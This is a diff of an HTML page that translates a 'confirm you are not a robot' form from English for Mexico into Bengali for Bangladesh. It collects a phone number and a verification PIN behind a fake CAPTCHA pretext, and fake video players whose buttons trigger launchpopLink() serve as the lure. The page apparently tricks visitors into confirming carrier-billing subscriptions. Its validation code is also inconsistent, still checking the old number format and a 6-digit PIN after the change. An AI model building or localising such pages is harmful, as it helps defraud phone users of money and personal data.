@@ -3,7 +3,7 @@
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title class="a1">注意！</title>
+        <title class="a1">মনোযোগ！</title>
         <link rel="stylesheet" type="text/css" href="/public/styles/styles.min.css">
         <link rel="shortcut icon" href="/public/images/action.ico">
         <script>
@@ -35,21 +35,21 @@
         
         <div class="container-pin"  id="container">
               
-            <h3>Confirm that you are not a robot</h3>             
+            <h3>নিশ্চিত করুন যে আপনি কোনও রোবট নন।</h3>             
             <br>
 
             <!-- 隐藏的 发送错误 信息 -->
             <div class="error-message" id="errorMessage" style="display: none;">
-                There was an error connecting to the verification service. Please try again later.
+             যাচাইকরণ পরিষেবার সাথে সংযোগ করার সময় একটি ত্রুটি হয়েছে। অনুগ্রহ করে পরে আবার চেষ্টা করুন।
             </div>                
             <!-- 隐藏的 发送成功 信息 -->
             <div class="success-message" id="successMessage" style="display: none;">
-                Verification code sent successfully!
+            যাচাইকরণ কোড সফলভাবে পাঠানো হয়েছে!
             </div>               
             <!-- 隐藏的 loading -->
             <div class="loading" id="loading">
                 <div class="loading-spinner"></div>
-                <p>Processing your request...</p>
+                <p>আপনার অনুরোধ প্রক্রিয়া করা হচ্ছে...</p>
             </div>
             
 
@@ -57,24 +57,24 @@
                 <!-- 1、手机号码输入框 -->
                 <div class="form-group">                        
                     <div class="phone-input">
-                        <span class="country-code">+52</span>
-                        <input type="text" name="msisdn" id="msisdn" placeholder="Eenter your phone number" required 
-                               pattern="[0-9]{3} [0-9]{3} [0-9]{3}" title="Please enter 9 digits in the format: xxx xxx xxx">
+                        <span class="country-code">+88</span>
+                        <input type="text" name="msisdn" id="msisdn" placeholder="আপনার ফোন নম্বর লিখুন" required 
+                               pattern="[0-9]{4} [0-9]{7}" title="অনুগ্রহ করে এই ফর্ম্যাটে 11 টি সংখ্যা লিখুন: 0123-4567890">
                     </div>                       
                 </div>
                 <!-- 2、验证码输入框 + 发送验证码按钮 -->
                 <div class="form-group">                   
                     <div class="pin-input-container-pin">
-                        <input type="text" name="pin" id="pin" class="pin-input" placeholder="Enter 6-digit PIN" 
-                               pattern="[0-9]{6}" title="Please enter 6 digits" maxlength="6" disabled>
-                        <button type="submit" class="send-pin-btn" id="sendPinBtn">Send PIN</button>
+                        <input type="text" name="pin" id="pin" class="pin-input" placeholder="4-সংখ্যার পিন লিখুন" 
+                               pattern="[0-9]{4}" title="অনুগ্রহ করে 4 টি সংখ্যা লিখুন" maxlength="4" disabled>
+                        <button type="submit" class="send-pin-btn" id="sendPinBtn">পিন পাঠান</button>
                     </div>                       
                 </div>             
             </form>
             
 
             <!-- 3、确认验证码按钮 -->
-            <button type="click" class="btn" id="verifyBtn" disabled>Verify PIN</button>
+            <button type="click" class="btn" id="verifyBtn" disabled>পিন যাচাই করুন</button>
         </div>
         
         <!-- 发送验证码及确认验证码JS -->
@@ -97,7 +97,7 @@
                 
                 // 简单的客户端验证
                 if (!input.value.match(/^\d{3} \d{3} \d{3}$/)) {
-                    errorDiv.textContent = 'Please enter a valid phone number in the format: xxx xxx xxx';
+                    errorDiv.textContent = 'দয়া করে এই ফর্ম্যাটে একটি বৈধ ফোন নম্বর লিখুন: 0123-4567890';
                     errorDiv.style.display = 'block';
                     return;
                 }
@@ -118,7 +118,7 @@
                     const result = await response.json();
                     
                     if (result.status === 'success') {
-                        successDiv.textContent = result.message || 'Verification code sent successfully!';
+                        successDiv.textContent = result.message || 'যাচাইকরণ কোড সফলভাবে পাঠানো হয়েছে!';
                         successDiv.style.display = 'block';
                         errorDiv.style.display = 'none';
                         
@@ -136,17 +136,17 @@
                         let countdown = 120; // 120秒倒计时
                         
                         // 更新按钮文本
-                        sendPinBtn.textContent = `Resend in ${countdown}s`;
+                        sendPinBtn.textContent = `আবার পাঠান ${countdown}s`;
                         
                         // 设置倒计时间隔
                         const countdownInterval = setInterval(() => {
                             countdown--;
-                            sendPinBtn.textContent = `Resend in ${countdown}s`;
+                            sendPinBtn.textContent = `আবার পাঠান ${countdown}s`;
                             
                             if (countdown <= 0) {
                                 clearInterval(countdownInterval);
                                 sendPinBtn.disabled = false;
-                                sendPinBtn.textContent = 'Send PIN';
+                                sendPinBtn.textContent = 'পিন পাঠান';
                             }
                         }, 1000);
                         
@@ -154,13 +154,13 @@
                     } 
                     else {
                         // 显示错误消息
-                        errorDiv.textContent = result.message || 'An error occurred. Please try again.';
+                        errorDiv.textContent = result.message || 'একটি ত্রুটি ঘটেছে। অনুগ্রহ করে আবার চেষ্টা করুন।';
                         errorDiv.style.display = 'block';
                     }
                 }
                 catch (error) {
                     // 处理网络错误
-                    errorDiv.textContent = 'Network error. Please check your connection and try again.';
+                    errorDiv.textContent = 'নেটওয়ার্ক ত্রুটি। অনুগ্রহ করে আপনার সংযোগ পরীক্ষা করে আবার চেষ্টা করুন।';
                     errorDiv.style.display = 'block';
                     console.error('Error:', error);
                 } 
@@ -176,16 +176,14 @@
                 let value = e.target.value.replace(/\D/g, '');
                 
                 // 如果超过10位，截取前10位
-                if (value.length > 9) {
-                    value = value.substring(0, 9);
+                if (value.length > 11) {
+                    value = value.substring(0, 11);
                 }
                 
                 // 根据数字长度进行格式化
                 let formattedValue = value;
-                if (value.length > 6) {
-                    formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 9);
-                } else if (value.length > 3) {
-                    formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6);
+                if (value.length > 4) {
+                    formattedValue = value.substring(0, 4) + ' ' + value.substring(4, 11) ;
                 }
                 
                 // 更新输入框的值
@@ -202,7 +200,7 @@
                 const player = document.getElementById('player');
                 // 验证PIN码
                 if (!pinInput.value.match(/^\d{6}$/)) {
-                    errorDiv.textContent = 'Please enter a valid 6-digit PIN code';
+                    errorDiv.textContent = 'অনুগ্রহ করে একটি বৈধ 6-সংখ্যার পিন কোড লিখুন।';
                     errorDiv.style.display = 'block';
                     return;
                 }
@@ -226,7 +224,7 @@
                     const result = await response.json();
                     // 如果返回success,重新给successDiv的textContent赋值
                     if (result.status === 'success') {
-                        successDiv.textContent = result.message || 'Verification successful!';
+                        successDiv.textContent = 'যাচাইকরণ সফল!';
                         successDiv.style.display = 'block';
                         
                         // 如果服务器返回了重定向地址，设置一个2秒的延时，然后重定向用户到相应的页面。
@@ -249,11 +247,11 @@
                         }
                     } 
                     else {
-                        errorDiv.textContent = result.message || 'Invalid verification code. Please try again.';
+                        errorDiv.textContent = 'অবৈধ যাচাইকরণ কোড। অনুগ্রহ করে আবার চেষ্টা করুন।';
                         errorDiv.style.display = 'block';
                     }
                 } catch (error) {
-                    errorDiv.textContent = 'Verification code is incorrect. Please check your PIN and try again.';
+                    errorDiv.textContent = 'যাচাইকরণ কোডটি ভুল। অনুগ্রহ করে আপনার পিনটি পরীক্ষা করে আবার চেষ্টা করুন।';
                     errorDiv.style.display = 'block';
                     console.error('Error:', error);
                 } finally {
@@ -288,13 +286,13 @@
         <div class="player-container">
             <div class="player bg1">
                 <div class="controls">
-                    <button class="button">▶</button>
+                    <button class="button" onclick="launchpopLink()">▶</button>
                     <div class="progress">
                         <div class="progress-filled"></div>
                     </div>
                     <div class="time">0:00 / 39:46</div>
-                    <button class="button">🔊</button>
-                    <button class="button">⛶</button>
+                    <button class="button" onclick="launchpopLink()">🔊</button>
+                    <button class="button" onclick="launchpopLink()">⛶</button>
                 </div>
                 <div class="player_content">
                     <img class="loading2" src="/public/images/loading2.svg" alt="">
@@ -310,13 +308,13 @@
         <div class="player-container">
             <div class="player bg2">
                 <div class="controls">
-                    <button class="button">▶</button>
+                    <button class="button" onclick="launchpopLink()">▶</button>
                     <div class="progress">
                         <div class="progress-filled"></div>
                     </div>
                     <div class="time">0:00 / 21:36</div>
-                    <button class="button">🔊</button>
-                    <button class="button">⛶</button>
+                    <button class="button" onclick="launchpopLink()">🔊</button>
+                    <button class="button" onclick="launchpopLink()">⛶</button>
                 </div>
                 <div class="player_content">
                     <img class="loading2" src="/public/images/loading2.svg" alt="">
@@ -333,13 +331,13 @@
         <div class="player-container">
             <div class="player bg3">
                 <div class="controls">
-                    <button class="button">▶</button>
+                    <button class="button" onclick="launchpopLink()">▶</button>
                     <div class="progress">
                         <div class="progress-filled"></div>
                     </div>
                     <div class="time">0:00 / 46:17</div>
-                    <button class="button">🔊</button>
-                    <button class="button">⛶</button>
+                    <button class="button" onclick="launchpopLink()">🔊</button>
+                    <button class="button" onclick="launchpopLink()">⛶</button>
                 </div>
                 <div class="player_content">
                     <img class="loading2" src="/public/images/loading2.svg" alt="">
@@ -356,13 +354,13 @@
         <div class="player-container">
             <div class="player bg4">
                 <div class="controls">
-                    <button class="button">▶</button>
+                    <button class="button" onclick="launchpopLink()">▶</button>
                     <div class="progress">
                         <div class="progress-filled"></div>
                     </div>
                     <div class="time">0:00 / 36:25</div>
-                    <button class="button">🔊</button>
-                    <button class="button">⛶</button>
+                    <button class="button" onclick="launchpopLink()">🔊</button>
+                    <button class="button" onclick="launchpopLink()">⛶</button>
                 </div>
                 <div class="player_content">
                     <img class="loading2" src="/public/images/loading2.svg" alt="">
